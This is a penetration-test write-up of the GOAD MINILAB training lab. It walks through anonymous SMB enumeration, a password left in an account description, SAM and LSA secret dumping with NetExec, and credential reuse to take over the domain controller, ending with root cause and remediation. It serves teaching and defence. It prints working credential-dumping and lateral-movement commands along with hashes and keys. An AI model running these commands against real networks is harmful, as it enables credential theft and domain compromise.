# GOAD MINILAB — Active Directory Penetration Test Writeup

*[🇺🇦 Українська](./WRITEUP.ua.md) · [🇷🇺 Русский](./WRITEUP.ru.md)*

## Overview

| | |
|---|---|
| **Lab** | GOAD MINILAB (Game Of Active Directory) |
| **Domain** | `mini.lab` (NetBIOS: `MINILAB`) |
| **Date** | October 2026 |
| **Objective** | Full domain compromise |
| **Result** | ✅ Achieved — local Administrator access on Domain Controller |

## Lab Topology

| Hostname | IP | Role | OS |
|---|---|---|---|
| DC01 | `192.168.56.30` | Domain Controller | Windows Server 2019 (Build 17763) |
| WS01 | `192.168.56.31` | Domain Workstation | Windows 10 (Build 19041) |

## Attack Chain Summary

```
Anonymous SMB enumeration (Null Session)
        │
        ▼
Password disclosure via SMB "description" field (bob:superman)
        │
        ▼
Local admin access on WS01 (bob)
        │
        ▼
SAM / LSA secrets dump on WS01
        │
        ▼
Plaintext credential discovered: vagrant:vagrant
        │
        ▼
Credential reuse on DC01 (vagrant:vagrant)
        │
        ▼
vagrant found in local "Administrators" group on DC01
        │
        ▼
Full control of Domain Controller (file system R/W, code execution)
```

---

## 1. Reconnaissance

### 1.1 Port Scanning

```bash
nmap -sV -sC -Pn 192.168.56.30
```

**DC01 — Key findings:**

| Port | Service | Notes |
|---|---|---|
| 53 | DNS | Simple DNS Plus |
| 88 | Kerberos | — |
| 389/3268 | LDAP / Global Catalog | Domain: `mini.lab` |
| 445 | SMB | — |
| 3389 | RDP | `MINILAB` NetBIOS domain confirmed via `rdp-ntlm-info` |

```bash
nmap -sV -sC -Pn 192.168.56.31
```

**WS01 — Key findings:**

| Port | Service | Notes |
|---|---|---|
| 135/139/445 | RPC/SMB | SMB signing **not required** (vs. DC where it's enforced) |
| 3389 | RDP | Confirms domain membership (`MINILAB`) |

### 1.2 Anonymous SMB Enumeration

SMB Null Session was found to be enabled on the Domain Controller:

```bash
nxc smb 192.168.56.30 -u '' -p '' --users
```

```
[*] ... (Null Auth:True) (DC:True)
-Username-    -Last PW Set-         -Description-
Guest         <never>               Built-in account for guest access...
bob           2026-10-19 17:32:30   (Password : superman)
dave          2026-10-19 17:32:54   -
```

**🔴 Finding #1 — Credential disclosure via SMB description field**

The user `bob`'s plaintext password (`superman`) was stored directly in the AD account's `description` attribute, readable via an unauthenticated (null session) SMB connection.

---

## 2. Initial Foothold — WS01

Credentials `bob:superman` were validated against WS01:

```bash
nxc smb 192.168.56.31 -u bob -p superman
```

```
[+] mini.lab\bob:superman (Pwn3d!)
```

The `(Pwn3d!)` flag confirms **local administrator privileges** for `bob` on WS01.

### 2.1 SYSVOL Access

With `bob`'s credentials, the SYSVOL share was accessed and Group Policy files were retrieved:

```bash
smbclient //192.168.56.30/SYSVOL -U "bob%superman"
```

GPO security templates (`GptTmpl.inf`) were extracted for offline review — no exploitable Group Policy Preferences (`cpassword`) were present in this environment.

### 2.2 SAM Hash Dump (WS01)

```bash
nxc smb 192.168.56.31 -u bob -p superman --sam
```

```
Administrator:500:...:89ca5bc62cb5f27bd58c292baaf45603:::
```

Local Administrator NTLM hash retrieved — candidate for offline cracking / Pass-the-Hash.

### 2.3 LSA Secrets Dump (WS01)

```bash
nxc smb 192.168.56.31 -u bob -p superman --lsa
```

```
vagrant:vagrant
dpapi_machinekey:8d9daa0c2db485f9c27249cba67e2e622cfbc290
dpapi_userkey:458929a0ee85af08110d395c0a12208e47572eca
```

**🔴 Finding #2 — Plaintext credentials in LSA secrets**

The credential pair `vagrant:vagrant` (leftover Vagrant provisioning account) was recovered **in plaintext** from LSA secrets storage on WS01.

---

## 3. Privilege Escalation — Credential Reuse to DC01

The recovered `vagrant:vagrant` credentials were tested directly against the Domain Controller:

```bash
nxc smb 192.168.56.30 -u vagrant -p vagrant
```

```
[+] mini.lab\vagrant:vagrant (Pwn3d!)
```

Full read/write access confirmed on administrative shares:

```bash
nxc smb 192.168.56.30 -u vagrant -p vagrant --shares
```

```
ADMIN$    READ,WRITE    Remote Admin
C$        READ,WRITE    Default share
NETLOGON  READ,WRITE    Logon server share
SYSVOL    READ,WRITE    Logon server share
```

**🔴 Finding #3 — Credential reuse across domain hosts**

The `vagrant` account, originally recovered from a workstation (WS01), was valid with full administrative rights on the Domain Controller (DC01) itself.

### 3.1 Privilege Source Analysis

Group membership was reviewed to determine the exact source of `vagrant`'s elevated access:

```bash
net rpc group members "Domain Admins" -U "vagrant%vagrant" -S 192.168.56.30
```
```
MINILAB\Administrator
MINILAB\alice
MINILAB\carol
```

`vagrant` is **not** a member of `Domain Admins`. Further inspection of the local `Administrators` group on DC01:

```bash
nxc ldap 192.168.56.30 -u vagrant -p vagrant --groups "Administrators" -o GROUP="Administrators"
```
```
Administrator
vagrant
Enterprise Admins
Domain Admins
```

**Root cause confirmed:** `vagrant` was added directly to the **local `Administrators` group on the Domain Controller** — not through the `Domain Admins` security group. On a Domain Controller, local administrator rights are functionally equivalent to full domain compromise (DCSync, GPO modification, Domain Admin account creation are all possible), since a DC has no separate local SAM authority independent from AD.

---

## 4. Root Cause & Impact

| | |
|---|---|
| **Root cause** | Deployment/provisioning account (`vagrant`) left in local `Administrators` group on DC after infrastructure setup |
| **Contributing factor** | Plaintext password storage in SMB description field (`bob`) |
| **Contributing factor** | Password reuse across hosts (`vagrant:vagrant` on both WS01 and DC01) |
| **Impact** | Full compromise of the `mini.lab` Active Directory domain |

## 5. Remediation Recommendations

1. **Never store credentials in AD attributes** (description, notes, etc.) — enforce via periodic LDAP audits.
2. **Remove provisioning/deployment accounts** from privileged groups after infrastructure setup is complete.
3. **Enforce unique, strong passwords** per host/service — eliminate credential reuse via a password manager or managed service accounts (gMSA).
4. **Disable SMB Null Sessions** (`RestrictAnonymous` registry settings) to prevent unauthenticated enumeration.
5. **Enforce SMB signing** on all domain hosts, not just the DC.
6. **Regularly audit local `Administrators` group membership** on all domain-joined systems, especially Domain Controllers.

---

## Tools Used

- `nmap` — network reconnaissance
- [NetExec (nxc)](https://github.com/Pennyw0rth/NetExec) — SMB/LDAP enumeration, credential validation, SAM/LSA dumping
- `smbclient` — share browsing and file retrieval
- [Impacket](https://github.com/fortra/impacket) — Kerberos/SMB exploitation suite
- `net rpc` (Samba) — group membership enumeration

## Lab Environment

Built using [GOAD (Game Of Active Directory)](https://github.com/Orange-Cyberdefense/GOAD) by Orange Cyberdefense — MINILAB configuration (VirtualBox provider).

---

*This writeup documents activity performed exclusively against an isolated, intentionally-vulnerable training lab for educational purposes.*
